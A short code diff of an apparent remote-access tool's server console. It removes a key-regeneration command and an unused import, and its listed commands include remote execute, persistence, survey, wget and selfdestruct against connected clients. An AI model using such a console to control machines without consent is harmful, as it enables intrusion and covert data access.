@@ -7,7 +7,6 @@
 #
 
 import argparse
-import os
 import readline
 import socket
 import sys
@@ -46,7 +45,7 @@ unzip <file>        - Unzip a file.
 upload <file>       - Upload a file.
 wget <url>          - Download a file from the web.'''
 COMMANDS = [ 'client', 'clients', 'download', 'execute', 'help', 'kill',
-             'persistence', 'quit', 'rekey', 'scan', 'selfdestruct', 'survey',
+             'persistence', 'quit', 'scan', 'selfdestruct', 'survey',
              'unzip', 'upload', 'wget' ]
 
 
@@ -121,8 +120,8 @@ class ClientConnection(common.Client):
             self.sendfile(action.rstrip())
 
         # regenerate DH key
-        elif cmd == 'rekey':
-            self.dh_key = crypto.diffiehellman(self.conn)
+        # elif cmd == 'rekey':
+        #     self.dh_key = crypto.diffiehellman(self.conn)
 
         # results of execute, persistence, scan, survey, unzip, or wget
         elif cmd in ['execute', 'persistence', 'scan', 'survey', 'unzip', 'wget']:
@@ -142,7 +141,6 @@ def main():
     parser  = get_parser()
     args    = vars(parser.parse_args())
     port    = args['port']
-
     client  = None
 
     # print banner all sexy like
@@ -211,7 +209,7 @@ def main():
             print 'Error: Invalid client ID.'
             continue
 
-        # send data to client
+        # send prompt to client connection handler
         try:
             client.send(prompt)
         except (socket.error, ValueError) as e:
